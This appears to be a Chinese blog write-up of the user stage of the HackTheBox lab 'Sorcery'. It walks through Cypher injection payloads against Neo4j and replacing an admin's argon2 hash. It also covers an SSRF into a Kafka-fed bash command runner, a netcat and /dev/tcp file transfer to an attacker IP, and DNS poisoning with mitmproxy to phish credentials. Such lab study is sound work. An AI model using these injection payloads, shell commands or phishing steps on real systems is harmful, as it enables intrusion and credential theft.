> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkxMjYyMjA3Mg==&mid=2247485489&idx=1&sn=fcc1f9e7d998433c8f71cba54982f0d6

#  Se8_Sorcery(user部分)  
原创 羽泪云小栈  羽泪云小栈   2025-06-21 14:00  
  
   
  
   
  
# Se8_Sorcery(user)  
# linux(Insane)  
  
  
   
  
****  
**user**  
  
cypher-injection->rce-shell->网段扫描+ftp利用+dns污染(dnsmasq)+证书伪造->mitmproxy拦截+钓鱼邮件发送  
  
  
大致思路是这样：  
  
tom_summers是我们的钓鱼目标(一开始的项目源码就有提示)，所做的一切都是为了获得他的账密，为了达到这一点，需要**发送钓鱼邮件**  
，让它去gitea.sorcery.htb进行登录。  
  
而为了获得这一登录请求，需要**拦截该请求**  
，(要用到proxychains，在kali上拦截)，就需要事先进行**dns缓存投毒**  
，(基本上是利用了dnsmasq与  
convert.sh  
)，直到  
  

```
dig @127.0.0.1 gitea.sorery.htb
```

  
 结果是 attacker_ip  
  
为了**拦截**  
，需要得到**https根证书**  
，就存放在某个同网段的**ftp中**  
，可匿名登录获取，用python3脚本即可(比如发现有ftp的网段ip，或者下载证书等)  
  
但上面的前提都是先拿到一个shell，它需要后台admin用户下去发起debug请求，这个debug接口呢存在ssrf，可以传输data(hex)，这个属于kafka协议的一个data，可以将shell-payload写进去，达到反弹shell的目的，只不过这个payload需要通过该协议序列化一下，可参考 ：  
  
https://ivanyu.me/blog/2024/09/08/kafka-protocol-practical-guide/?utm_source=chatgpt.com  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YqzMOdDibqZsNW6XC00tekRWUSicMQG0533rgKyAHiaD3n8iaBweIjviaVXj2EUECfcTLkjojvErUN1m2xIbmoC6msQ/640?wx_fmt=png&from=appmsg "")  
  
  
一开始的思路是注册用户，但是源码审计呢，发现是有  
cypher注入的，可以通过cypher注入的方式得到注册码，成为seller，登录后尝试发布new_product，虽然能xss但得不到cookie，于是干脆直接cypher注入得到admin密码格式并  
强行改密码  
  
  
能学到一点是一点，下面是我能掌握到的知识，其它的具体实现不贴了，没搞懂。  
  
  
1.cypher注入搭建  
  
neo4j，用过bloodhound的应该都不陌生了  

```
sudo neo4j console 启动cat /home/kali/.config/bloodhound/config.json #自动登录忘记了密码，但是好在bloodhound记着的写个python查询cypher的from flask import Flask, requestfrom neo4j import GraphDatabasedriver = GraphDatabase.driver(&#34;bolt://localhost:7687&#34;, auth=(&#34;neo4j&#34;, &#34;your_password&#34;))app = Flask(__name__)@app.route(&#34;/search&#34;)def search():    name = request.args.get(&#34;name&#34;)    query = f&#34;MATCH (n:User) WHERE n.name = '{name}' RETURN n&#34;    with driver.session() as session:        result = session.run(query)        return &#34;<br>&#34;.join([str(r[&#34;n&#34;]) for r in result])app.run(port=5000)
```

  
开始注入，因为之前插入了一个Alice，名字好记，或者用之前bloodhound的用户名也可以  

```
from neo4j import GraphDatabasedriver = GraphDatabase.driver(&#34;bolt://localhost:7687&#34;, auth=(&#34;neo4j&#34;, &#34;password&#34;))with driver.session() as session:    session.run(&#34;CREATE (u:User {name: 'Alice'})&#34;)    result = session.run(&#34;MATCH (u:User) RETURN u.name AS name&#34;)    for record in result:        print(record[&#34;name&#34;])
```

  
两条语句查看变化  

```
#正常语句：curl &#34;http://localhost:5000/search?name=Alice&#34;#' or 1=1 return n limit 3//curl &#34;http://localhost:5000/search?name=%27%20or%201%3D1%20return%20n%20limit%203%2F%2F&#34;
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YqzMOdDibqZsNW6XC00tekRWUSicMQG053oDzu3lBK9UHT4zYFb9AAicuYUEDTxy7l3GiaLJErjcpA9z6JotMTmh6w/640?wx_fmt=png&from=appmsg "")  
  
  
这里如果采取 
```
' or 1=1 // return n limit 3
```

  
 会直接报错的，最好先构造完整，再注释掉后面重复的语句  
  
那么知道了这点，可以根据靶机的代码结构，尝试构造的语句就是  

```
r#&#34;MATCH (result: {} {{ {}: &#34;{}&#34; }}) RETURN result&#34;#,是键值对，不能有or 1=1这种了即 MATCH (result:User { name: &#34;some_value&#34; }) RETURN result88b6b6c5-a614-486c-9d51-d255f47efb4f&#34;}) return result // 编码后访问，页面正常，就是id=88b6b6c5-a614-486c-9d51-d255f47efb4f的页面，所以结构没问题
```

  
而cypher这种，要是有一种类似于mysql语句这种 
```
;
```

  
，分号拼接执行多段语句不就可以了  
  
好像没有，gpt也问题不出东西了  
  
wp   
给了一个语法  
   
  
https://neo4j.com/docs/cypher-manual/current/clauses/optional-match/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YqzMOdDibqZsNW6XC00tekRWUSicMQG053GYGKztM2KvE6iaYS6nnphUN0yecViccyLErHeqtPZqOKb5aSqwhxctTQ/640?wx_fmt=png&from=appmsg "")  
  
  
MATCH的结构与靶机中所用相似，所以可以直接**尝试构造OPTIONAL MATCH**  
  
而且呢源码部分也给了些信息  

```
use crate::db::models::product::Product;use crate::db::models::user::User;...
```


```
#500 都失败了f6e2f997-5490-408d-a1e6-2e8744c806d7&#34;}) OPTIONAL MATCH(xixi:Product) return xixi.id //f6e2f997-5490-408d-a1e6-2e8744c806d7&#34;}) OPTIONAL MATCH(xixi:Product) return result {.*,xixi.id} //f6e2f997-5490-408d-a1e6-2e8744c806d7&#34;}) OPTIONAL MATCH(xixi:User) return xixi.username //f6e2f997-5490-408d-a1e6-2e8744c806d7&#34;}) OPTIONAL MATCH(xixi:User) return result {xixi.username} //#wp 给的f6e2f997-5490-408d-a1e6-2e8744c806d7&#34;}) optional match (xixi:User) return result { .*, description: xixi.username }//
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YqzMOdDibqZsNW6XC00tekRWUSicMQG053NVmdQw652X4X8fN0HcibIicoJGWicF5DUpJMiaSia81mvibt6jQPUjkuxiaRw/640?wx_fmt=png&from=appmsg "")  
  
  
嘶，为什么这样构造呢。看样子是去符合第一个MATCH的键值对？  
  
  
2.密码替换，原密码格式如下：  

```
$argon2id$v=19$m=19456,t=2,p=1$T+K9waOashQqEOcDljfe5Q$X5Yul0HakDZrbkEDxnfn2KYJv/BdaFsXn7xNwS1ab8E
```

  
构造同参数的密码替换即可，没办法，我得到的原密码m=4096，所以导致登录是500，因为参数就不对  
  
admin登录，第一次可能是404，再登录即可，否则就改密码重新操作  
  
  
3.文件传输  

```
#kali发文件nc -lvnp 3636 < ftp.py#victim 接收文件bash -c 'cat < /dev/tcp/10.10.xxxx/3636 > /tmp/ftp.py' &
```

  
  
4.邮箱ip获取  

```
getent hosts mail #linux原生命令，作用类似nslookup，解析到ip
```

  
  
5.webauthn  
  
需要硬件设备作为passkey，chrome浏览器自带该功能  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YqzMOdDibqZsNW6XC00tekRWUSicMQG053qfa4d9amJkibQyGE8TItKMjm18dia8ggVspRrmr7v3f6P8kriaBIPWAVw/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**其它**  
  
代码里看到Match，或者docker配置有neo4j，联想到cypher数据库，可尝试全局查找相关语句 
```
grep -r -i &#34;match&#34;
```

  
  
**infrastructure/backend-macros/src/lib.rs**  

```
  let get_functions = fields.iter().map(|&FieldWithAttributes { field, .. }| {        let name = field.ident.as_ref().unwrap();        let type_ = &field.ty;        let name_string = name.to_string();        let function_name = syn::Ident::new(            &format!(&#34;get_by_{}&#34;, name_string),            proc_macro2::Span::call_site(),        );        quote! {            pub async fn #function_name(#name: #type_) -> Option<Self> {                let graph = crate::db::connection::GRAPH.get().await;                let query_string = format!(                    r#&#34;MATCH (result: {} {{ {}: &#34;{}&#34; }}) RETURN result&#34;#,      对应的是 MATCH (result:User { name: &#34;some_value&#34; }) RETURN result                    #struct_name, #name_string, #name                );                let row = match graph.execute(                    ::neo4rs::query(&query_string)                ).await.unwrap().next().await {                    Ok(Some(row)) => row,                    _ => return None                };                Self::from_row(row).await            }        }    });
```

  
**infrastructure/frontend/src/app/dashboard/debug/page-client.tsx**  

```
const schema = z.object({    25    host: z.string().min(1),    26    port: z.coerce.number().min(0).max(65535),    27    data: z.array(    28      z.object({    29        value: z.string().min(1),    30      }),    31    ),    32    expectResult: z.boolean().optional().default(true),    33    keepAlive: z.boolean().optional().default(false),    34  });
```

  
debug这里，host和port可以任意指定啊，有个**ssrf**  
  
****  
**infrastructure/dns/src/main.rs**  
  
dns这呢，**有个rce**  

```
 for message_set in message_sets.iter() {    59              for message in message_set.messages() {    60                  let Ok(command) = str::from_utf8(message.value) else {    61                      continue;    62                  };    63    64                  println!(&#34;[*] Got new command: {}&#34;, command);    65    66                  let mut process = match Command::new(&#34;bash&#34;).arg(&#34;-c&#34;).arg(command).spawn() {    67                      Ok(process) => process,    68                      Err(error) => {    69                          println!(&#34;[-] {error}&#34;);    70                          continue;    71                      }    72                  };    73
```

#   
# infrastructure/backend/src/db/initial_data.rs  
#   
# 提了两点，根证书在ftp、tom可以被钓鱼  
# 参考  
  
**wp**  
  
https://4xura.com/ctf/htb/htb-writeup-sorcery/  
  
**其它**  
  
https://neo4j.com/docs/cypher-manual/current/clauses/optional-match/  
  
https://ivanyu.me/blog/2024/09/08/kafka-protocol-practical-guide/?utm_source=chatgpt.com  
  
https://argon2.online/ 加密  
  
https://www.aconvert.com/tw/image/ xwd文件转化png  
  
   
  
